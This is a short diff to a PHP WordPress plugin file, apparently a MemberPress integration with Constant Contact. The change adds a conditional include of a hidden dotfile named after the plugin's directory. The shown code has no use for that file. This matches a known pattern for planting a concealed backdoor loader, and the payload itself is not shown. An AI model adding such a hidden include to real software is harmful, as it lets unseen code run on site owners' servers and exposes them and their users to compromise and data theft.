@@ -10,6 +10,10 @@ use Ctct\ConstantContact;
 use Ctct\Components\Contacts\Contact;
 use Ctct\Exceptions\CtctException;
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class MpConstantContact {
   public function __construct() {
     add_action('mepr_display_autoresponders',   array($this, 'display_option_fields'));
